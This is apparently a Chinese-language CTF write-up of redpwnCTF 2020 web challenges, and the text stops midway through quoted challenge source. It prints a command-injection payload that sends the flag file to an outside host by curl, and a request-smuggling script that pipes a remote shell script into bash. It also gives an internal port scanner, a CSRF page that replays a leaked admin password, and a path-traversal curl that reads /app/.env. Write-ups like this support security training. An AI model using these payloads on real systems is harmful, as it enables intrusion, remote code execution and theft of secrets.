> Request smuggling has many meanings. Prove you understand at least one of
> them at [2020.redpwnc.tf:31957](http://2020.redpwnc.tf:31957/).
>
> Note: There are a lot of time-wasting things about this challenge. Focus on
> finding the vulnerability on the backend API and figuring out how to exploit
> it.
给了源码，看到api/server.py中
    def get_note(nid):
        stdout, stderr = subprocess.Popen(f"cat 'notes/{nid}' || echo it did not work btw", shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE).communicate()
        if stderr:
            print(stderr) # lemonthink
            return {}
        return {
            'success' : True,
            'title' : nid,
            'contents' : stdout.decode('utf-8', errors = 'ignore')
        }
很明显有命令注入，nid是由web/server.py中`/notes/`传入
`payload：/notes/x';curl ip --data [@flag](https://github.com/flag
"@flag").txt;'`
尝试了很多直接反弹shell的payload，最后base64一下才成功反弹成功
还有一种做法是ssrf+http走私,但是我复现的时候没成功
web运行在外网，api是运行在内网且端口未知，端口在50000-51000
    if __name__ == '__main__':
        backend_port = random.randint(50000, 51000)
        at = threading.Thread(target = api_server.start, args = (backend_port,))
        wt = threading.Thread(target = web_server.start, args = (backend_port,))
`check_link()`可以探测内网，知道端口号后就可以走私，这里借用y1ng师傅的脚本
    # 探测端口
    import requests as req
    url = "http://2020.redpwnc.tf:31957/check-links"
    data = {"links":""}
    for i in range(50000,51000):
        api = "http://localhost:{}".format(i)
        data["link"] = api
        r = req.post(url, data=data)
        if r"true" in r.text:
            print("success:"+str(i))
            break
    # 走私，命令执行
    #!/usr/bin/env python3
    #-*- coding:utf-8 -*-    #__author__: 颖奇L'Amore www.gem-love.com
    import requests as req
    from urllib.parse import quote as urlen
    url = "http://2020.redpwnc.tf:31957/check-links"
    #bash中用#把后面的命令过滤掉
    smuggling = "http://127.0.0.1rnrnGET /api/v1/notes/?title=" + urlen("';curl http://gem-love.com/shell.txt|bash #") + " HTTP/1.1rnrn:50596"
    data = {"links":smuggling}
    req.post(url, data=data)
## web/cookie-recipes-v2
> I want to buy some of these recipes, but they are awfully expensive. Can you
> take a look?
>
> Site: [cookie-recipes-v2.2020.redpwnc.tf](https://cookie-> recipes-v2.2020.redpwnc.tf/)
登陆进去是一个商店，可以买flag，账户里有的积分不出所料的不够。有一个可以拿积分的地方，可以提交一个url
到这里就没什么思路了，给了源码,源码中有很多api接口，列出后面用到的几个
api/getId 获取当前用户ID
api/userInfo 获取用户信息，能看到密码
api/gift 送积分
详细看gift的代码
    // Make sure request is from admin
            try {
                if (!database.isAdmin(id)) {
                    res.writeHead(403);
                    res.end();
                    return;
                }
            } catch (error) {
                res.writeHead(500);
                res.end();
                return;
            }
    // Make sure user has not already received a gift
            try {
                if (database.receivedGift(user_id)) {
                    util.respondJSON(res, 200, result); 
                    return;
                }
            } catch (error) {
                res.writeHead(500);
                res.end();
                return;
            }
    // Check admin password to prevent CSRF
            let body;
            try {
                body = await util.parseRequest(req);
            } catch (error) {
                res.writeHead(400);
                res.end();
                return;
            }
    // User can only receive one gift
            try {
                database.setReceived(user_id);
            } catch (error) {
                res.writeHead(500);
                res.end();
            }
要求是管理员，在送的时候需要输入管理员的密码，且只能一次队伍送一次，我们可以从
    https://cookie-recipes-v2.2020.redpwnc.tf/api/userInfo?id=0
得到管理员密码，尝试登陆显示`IP address not allowed`,那只能通过url输入的地方尝试csrf，构造数据包应该是这样
    POST /api/gift?id=1141126652894855019 HTTP/1.1
    Host: cookie-recipes-v2.2020.redpwnc.tf
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: text/plain
    Content-Length: 47
    Connection: close
    {"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"}
id从`/api/userInfo`获取，需要发送json，从老外wp上学一手用xml构造csrf
        async function jsonreq() {
            var xhr = new XMLHttpRequest()
            xhr.open("POST","https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=1141126652894855019", true);
            xhr.withCredentials = true;
            xhr.setRequestHeader("Content-Type","text/plain");
            xhr.send(JSON.stringify({"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"}));
        }
        for (var i = 0; i 
因为只能送一次积分，所以重复发尝试绕过这个限制。把这个页面放自己服务器，可以用python起服务，直接访问
    python -m SimpleHTTPServer 4040
提交 `ip:4040/csrf.html`,发过去后查看自己的账号有足够的积分，买flag美滋滋
ps.这题还有非预期，直接跨目录读/app/.env
    curl --path-as-is https://cookie-recipes-v2.2020.redpwnc.tf/../../../../app/.env
## web/Viper
> Don’t you want your own ascii viper? No? Well here is Viper as a Service. If
> you experience any issues, send it [here](https://admin-> bot.redpwnc.tf/submit?challenge=viper)
>
> NOTE: The admin bot will only accept websites which match the following
> regex: `^http://2020.redpwnc.tf:31291/viper/[0-9a-f-]+$`
>
> Site: [2020.redpwnc.tf:31291](http://2020.redpwnc.tf:31291/)
这题涨知识了！老外真骚
进去之后可以点击create创建个人页面，然后就没有什么有价值的东西了，给了源码
    "use strict";
    /*
     *  @REDPWNCTF 2020
     *  @AUTHOR Jim
     */
    const express = require("express");
    const bodyParser = require("body-parser");
    const session = require('express-session');
    const redis = require('redis');
    const redisStore = require('connect-redis')(session);
    const mcache = require('memory-cache');
    const { v4: uuidv4 } = require('uuid');
    const fs = require("fs");
    const app = express();
    const client  = redis.createClient('redis://redis:6379');
    app.use(express.static(__dirname + "/public"));
    app.use(bodyParser.json());
    app.use(session({
        secret: 'REDACTED', // README it's not literally REDACTED on server
        store: new redisStore({ host: 'redis', port: 6379, client: client}),
        saveUninitialized: false,
        resave: false
    }));
    app.use(function(req, res, next) {
        res.setHeader("Content-Security-Policy", "default-src 'self'");
        res.setHeader("X-Frame-Options", "DENY")
        return next();
    });
    app.set('view engine', 'ejs');
    const middleware = (duration) => {
        return(req, res, next) => {
            const key = '__rpcachekey__|' + req.originalUrl + req.headers['host'].split(':')[0];
            let cachedBody = mcache.get(key);
            if(cachedBody){
                res.send(cachedBody);
                return;
            }else{
                res.sendResponse = res.send;
                res.send = (body) => {
                    mcache.put(key, body, duration * 1000);
                    res.sendResponse(body);
                }
                next();
            }
        }
    };
    app.get('/create', function (req, res) {
        let sess = req.session;
        if(!sess.viperId){
            const newViperId = uuidv4();
            sess.viperId = newViperId;
            sess.viperName = newViperId;
        }
        res.redirect('/viper/' + encodeURIComponent(sess.viperId));
    });
    app.get('/', function(req, res) {
        res.render('pages/index');
    });
    app.get('/viper/:viperId', middleware(20), function (req, res) {
        let viperId = req.params.viperId;
        let sess = req.session;
        const sessViperId = sess.viperId;
        const sessviperName = sess.viperName;
        if(sess.isAdmin){
            sess.viperId = "admin_account";
            sess.viperName = "admin_account";
        }
        if(viperId === sessViperId || sess.isAdmin){
            res.render('pages/viper', {
                name: sessviperName,
                analyticsUrl: 'http://' + req.headers['host'] + '/analytics?ip_address=' + req.headers['x-real-ip']
            });
        }else{
            res.redirect('/');
        }
    });
    app.get('/editviper', function (req, res) {
        let viperName = req.query.viperName;
        let sess = req.session;
        if(sess.viperId){
            sess.viperName = viperName;
            res.redirect('/viper/' + encodeURIComponent(sess.viperId));
        }else{
            res.redirect('/');
        }
    });
    app.get('/logout', function (req, res) {
        let sess = req.session;
        sess.destroy();
        res.redirect('/');
    });
    app.get('/analytics', function (req, res) {
        const ip_address = req.query.ip_address;
        if(!ip_address){
            res.status(400).send("Bad request body");
            return;
        }
        client.exists(ip_address, function(err, reply) {
            if (reply === 1) {
                client.incr(ip_address, function(err, reply) {
                    if(err){
                        res.status(500).send("Something went wrong");
                        return;
                    }
                    res.status(200).send("Success! " + ip_address + " has visited the site " + reply + " times.");
                });
            } else {
                client.set(ip_address, 1, function(err, reply) {
                    if(err){
                        res.status(500).send("Something went wrong");
                        return;
                    }
                    res.status(200).send("Success! " + ip_address + " has visited the site 1 time.");
                });
            }
        });
     });
     // README: This is the code used to generate the cookie stored on the admin user
     app.get('/admin/generate/:secret_token', function(req, res) {
        const secret_token = "REDACTED"; // README it's not literally READACTED on chall server
        if(req.params.secret_token === secret_token){
            let sess = req.session;
            sess.viperId = "admin_account";
            sess.viperName = "admin_account";
            sess.isAdmin = true;
        }
        res.redirect('/');
     });
     const getRandomInt = (min, max) => {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
     };
     app.get('/admin', function (req, res) {
        let sess = req.session;
        if(sess.isAdmin){
            client.exists('__csrftoken__' + sess.viperId, function(err, reply) {
                if(err){
                    res.status(500).send("Something went wrong");
                    return;
                }
                if (reply === 1) {
                    client.get('__csrftoken__' + sess.viperId, function(err, reply) {
                        if(err){
                            res.status(500).send("Something went wrong");
                            return;
                        }
                        res.render('pages/admin', {
                            csrfToken: Buffer.from(reply).toString('base64')
                        });
                    });
                } else {
                    const randomToken = getRandomInt(10000, 1000000000);
                    client.set('__csrftoken__' + sess.viperId, randomToken, function(err, reply) {
                        if(err){
                            res.status(500).send("Something went wrong");
                            return;
                        }
                        res.render('pages/admin', {
                            csrfToken: Buffer.from(randomToken).toString('base64')
                        });
                    });
                }
            });
        }else{
            res.redirect('/');
        }
     });
     app.get('/admin/create', function(req, res) {
        let sess = req.session;
        let viperId = req.query.viperId;
        let csrfToken = req.query.csrfToken;
        const v4regex = new RegExp("^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$", "i");